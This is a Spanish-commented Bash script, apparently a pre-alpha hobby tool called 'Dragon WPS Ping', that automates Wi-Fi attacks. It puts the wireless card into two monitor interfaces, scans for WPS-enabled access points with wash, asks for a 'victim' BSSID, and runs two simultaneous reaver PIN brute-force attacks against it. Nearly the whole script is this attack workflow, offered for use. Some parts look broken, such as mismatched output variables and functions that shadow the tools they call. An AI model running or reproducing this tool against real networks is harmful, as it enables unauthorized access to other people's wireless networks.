####################################################################3
#Dragon WPS Ping 1.0 by NworksDev
#
#1)Funcion de limpieza y restablecer interfaces despues del uso
#2)Funcion de set automatico de interfaz y habilitar 2 monitores 
#3)Funcion de chequeo de dependecias 
#4)implentacion de Reaver y wash
#5)implementacion de algoritmo Reaver Doble Attack
#
#
#
####################################################################3



#Modo 
DRAGON_MODE=0
# Ajusta el Script en modo normal o desarrollador
if [ $DRAGON_MODE = 1 ]; then
	## set to /dev/stdout when in developer/debugger mode
	export dragon_output_device=/dev/stdout
	HOLD="-hold"
else
	## set to /dev/null when in production mode
	export dragon_output=/dev/null
	HOLD=""
fi

	HOLD="-hold"

	#MONITER=wlan0mon

# Ruta de almacenamiento de datos
 
function checkdependences {
	
	echo "Verificando Dependencias Instaladas"
    echo " " 
	echo -ne "airmon-ng---->"
	if ! hash airmon-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor""
		salir=1
	else
		echo -e "\e[1;32mREADY UP!!"$rescolor""
	fi
	sleep 0.025


	echo -ne "Reaver---->"
	if ! hash reaver 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor""
		salir=1
	else
		echo -e "\e[1;32mREADY UP!!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "Wash ------->"
	if ! hash wash 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor""
		salir=1
	else
		echo -e "\e[1;32mREADY UP!!"$rescolor""
	fi
	sleep 3
}

function Dragon {
  # Intro del script

	clear
	echo "" 
	sleep 0.1 && echo -e $rojo"                             /           /"
	sleep 0.1 && echo -e $rojo"                            /' .,,,,  ./"
	sleep 0.1 && echo -e $rojo"                           /';'     ,/"
	sleep 0.1 && echo -e $rojo"                          / /   ,,//,'''         ___"
	sleep 0.1 && echo -e $rojo"                         ( ,, '_,  ,,,' ``     <    ___"
	sleep 0.1 && echo -e $rojo"                         |    /@  ,,, ;'' '     {      ____"
	sleep 0.1 && echo -e $rojo"                        /    .   ,''/' ',``'     )"
	sleep 0.1 && echo -e $rojo"                       /   .     ./, ',, ' :      )"
	sleep 0.1 && echo -e $rojo"                    ,./  .   ,-,','' ,,/'\,'       )"
	sleep 0.1 && echo -e $rojo"                   |   /; ./,,'',,'' |   |          )"
	sleep 0.1 && echo -e $rojo"                   |     /   ','    /    |         ("
	sleep 0.1 && echo -e $rojo"                    \___/'   '     |     |       ("
	sleep 0.1 && echo -e $rojo"                      ',,'  |      /     '|    ("
	sleep 0.1 && echo -e $rojo"                           /      |        ~|("
	sleep 0.1 && echo -e $rojo"                          '       ("
	sleep 0.1 && echo -e $rojo"                         :"
	sleep 0.1 && echo -e $rojo"                        ; .         \--"
	sleep 0.1 && echo -e $rojo"                      :   \         : ("
	sleep 0.1 && echo -e $rojo"  ___                          __      __         ___ _           "
	sleep 0.1 && echo -e $rojo" |   \ _ _ __ _ __ _ ___ _ _   \ \    / / __ ___ | _ (_)_ _  __ _ "
	sleep 0.1 && echo -e $rojo" | |) | I_/ _I / _I / _ \ I \   \ \/\/ / I_ (_-< |  _/ | I \/ _| |"
	sleep 0.1 && echo -e $rojo" |___/|_| \__,_\__, \___/_||_|   \_/\_/| .__/__/ |_| |_|_||_\__, |"
	sleep 0.1 && echo -e $rojo"               |___/                   |_|                  |___/"
	sleep 1
	echo -e $rojo"                         DWPS "$blanco""$version" (rev. "$verde"1.0"$blanco") "$amarillo"by "$blanco" NworksDev"
	sleep 1
	echo -e $verde"                        Para "$rojo"Hacking Publico y Sistemas Informacion "$rescolor
	sleep 1
	echo -n "                              Vercion Pre-Alpha"
	tput civis
	echo ""
	echo ""
	echo ""
	
	sleep 2
    
    mostrarheader
    echo "Escaneo de Resdes con WPS activo"
	

}


function mostrarheader(){
	
	
	echo -e "$verde#########################################################"
	echo -e "$verde#                                                       #"
	echo -e "$verde#$rojo		 DWPS $version" "${amarillo}by ""${azul}NworksDev""$verde                   #"
	echo -e "$verde#""${rojo}	W""${amarillo}ireless" "${rojo}O""${amarillo}ffensive" "${rojo}L""${amarillo}ong To ""${rojo}F""${amarillo}orce #"
	echo -e "$verde#                                                       #"
	echo -e "$verde#########################################################""$rescolor"
	echo
	echo
}

# Escoge las interfaces a usar
function setinterface {
	clear 
	mostrarheader
	# Coge todas las interfaces en modo monitor para detenerlas
	KILLMONITOR=`iwconfig 2>&1 | grep Monitor | awk '{print $1}'`
	
	for monkill in ${KILLMONITOR[@]}; do
		./airmon stop $monkill >$dragon_output
		echo -n "$monkill, "
	done
	
	# Crea una variable con la lista interfaces de red fisicas
	readarray -t wirelessifaces < <(./airmon |grep "-" | cut -d- -f1)
	INTERFACESNUMBER=`./airmon| grep -c "-"`
	 
	 
	 
	 # Si solo hay 1 tarjeta wireless
	if [ "$INTERFACESNUMBER" -gt "0" ]; then
		
		echo "Seleccione la interfaz:"
		echo
		i=0
		
		for line in "${wirelessifaces[@]}"; do
			i=$(($i+1))
			wirelessifaces[$i]=$line
			echo -e "$verde""$i)"$rescolor" $line"
		done
		
		echo -n "#? "
		read line
		PREWIFI=$(echo ${wirelessifaces[$line]} | awk '{print $1}')
		
		if [ $(echo "$PREWIFI" | wc -m) -le 3 ]; then
			
			mostrarheader
			setinterface
		fi
		
		readarray -t softwaremolesto < <(./airmon check $PREWIFI | tail -n +8 | grep -v "on interface" | awk '{ print $2 }')
		WIFIDRIVER=$(./airmon | grep "$PREWIFI" | awk '{print($(NF-2))}')
		rmmod -f "$WIFIDRIVER" &>$dragon_output 2>&1
		
		for molesto in "${softwaremolesto[@]}"; do
			killall "$molesto" &>$dragon_output
		done
		sleep 0.5
		
		modprobe "$WIFIDRIVER" &>$dragon_output 2>&1
		sleep 0.5
		# Selecciona una interface
		select PREWIFI in $INTERFACES; do
			break;
		done
		
		WIFIMONITOR=$(./airmon start $PREWIFI | grep "enabled on" | cut -d " " -f 5 | cut -d ")" -f 1)
		WIFI_MONITOR=$WIFIMONITOR
        
        sleep 0.5

		WIFIMONITOR2=$(./airmon start $PREWIFI | grep "enabled on" | cut -d " " -f 5 | cut -d ")" -f 1)
		WIFI_MONITOR2=$WIFIMONITOR2
		# Establece una variable para la interface fisica
		  WIFI=$PREWIFI
		# Cerrar si no detecta nada
	else
		
		echo No se han encontrado tarjetas Wireless. Cerrando...
		sleep 5
		exitmode
	fi
	 clear
	 mostrarheader
	 sleep 0.5
	 echo "2 nuevos monitores en linea"
	 echo""
	 echo""
	 sleep 0.5
	 iwconfig
	 echo ""
	 echo "" 


	}


	
	

function wash {
    echo""
    echo""
	#xterm -title "Escaneando Objetivos vvvv" -e airodump-ng -w TMP/infoAP -a $WIFI_MONITOR2  &
    
    xterm -hold -title "wash cerrar en 20 segundos" -e wash -i $WIFI_MONITOR -o TMP/infoAP 
    
   
	 
}

function reaver {
	echo"Reporte de redes con WPS activo por wash"
	echo""
	head -150 TMP/infoAP
	echo""
	echo""

	echo "Escriba o copie el bssid de la victima vvvv"
	read bssid
	
    
	xterm -hold -title "Ataque Primario" -e reaver -i $WIFI_MONITOR -b $bssid -vv   &
	xterm -hold -title "Ataque secundario" -e reaver -i $WIFI_MONITOR2 -b $bssid -p 5555 -vv 

	salidascript 
    

}


trap salidascript SIGINT SIGHUP 

function salidascript {
	
	echo -e "\n\n"$blanco"["$rojo" "$blanco"] "$rojo"Ejecutando la limpieza y cerrando."$rescolor""
	
	
	if ps -A | grep -q airodump-ng; then
		echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Matando "$gris"airodump-ng"$rescolor""
		killall airodump-ng &>dragon_output
	fi
	
	
	if [ "$WIFI_MONITOR" != "" ]; then
		echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Deteniendo interface "$verde"$WIFI_MONITOR"$rescolor""
		./airmon stop $WIFI_MONITOR &> dragon_output
	fi
	
	if [ "$WIFI_MONITOR2" != "" ]; then
		echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Deteniendo interface "$verde"$WIFI_MONITOR"$rescolor""
		./airmon stop $WIFI_MONITOR2 &> dragon_output
	fi
	
	if [ "$WIFI" != "" ]; then
		echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Deteniendo interface "$verde"$WIFI"$rescolor""
		./airmon stop $WIFI &> dragon_output
	fi
	
	if [ "$(cat /proc/sys/net/ipv4/ip_forward)" != "0" ]; then
		echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Restaurando "$gris"ipforwarding"$rescolor""
		echo "0" > /proc/sys/net/ipv4/ip_forward #stop ipforwarding
	fi
	
	if [ $DRAGON_MODE != 1 ]; then
		
		echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Eliminando "$gris"archivos"$rescolor""
		rm -R TMP/* &>$dragon_output
	fi
	
	echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Reiniciando "$gris"NetworkManager"$rescolor""
	service network-manager start &> dragon_output &
	
	echo -e ""$blanco"["$verde"+"$blanco"] "$verde"Servicios Normales reiniciados"$rescolor""
	exit
	
}
mostrarheader
checkdependences
clear
Dragon
setinterface
wash
reaver 
#logoff
